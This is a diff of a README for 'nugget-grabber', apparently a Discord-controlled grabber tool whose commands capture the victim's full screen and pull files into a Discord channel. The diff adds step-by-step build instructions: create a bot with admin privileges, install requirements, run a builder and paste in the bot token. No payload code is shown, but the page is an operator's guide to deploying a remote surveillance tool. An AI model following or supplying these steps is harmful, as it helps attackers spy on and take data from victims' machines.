@@ -23,7 +23,18 @@ This command prompts the user to upload a specified number of files. The bot wai
 This command captures a screenshot of the entire screen and sends it as an image file in the Discord channel.
 
 # Setup
-1. run `pip install -r packs.txt`
-2. open builder
-3. yadiyadiyadah
-4. done
+1. Make a discord application using [https://discord.com/developers/applications](discord's developer portal)
+2. Click on `bot` <p align="center">
+  <img width="500" src="https://github.com/starshotaka90roirio/nugget-grabber/assets/147278573/aa473a98-a353-460d-a8dc-b81ea015927c">
+</p>
+
+3. Make-a-bot!
+4. Enable admin privelages, and enable discord gateway intents.
+5. Congrats! You built a bot! still not done though . . .
+6. Run `pip install -r packs.txt` in the command-line (this installs necessary libraries)
+7. Run `builder.bat`
+8. Go back to your discord bot page
+9. Click on reset token then copy your token (DO NOT SHARE YOUR TOKEN! A TOKEN IS LIKE A PASSWORD TO YOUR BOT, IF SOMEONE GOT IT, ITS BAD!)
+10. Back to builder and paste your token
+11. Wait til' it builds
+12. Voila!
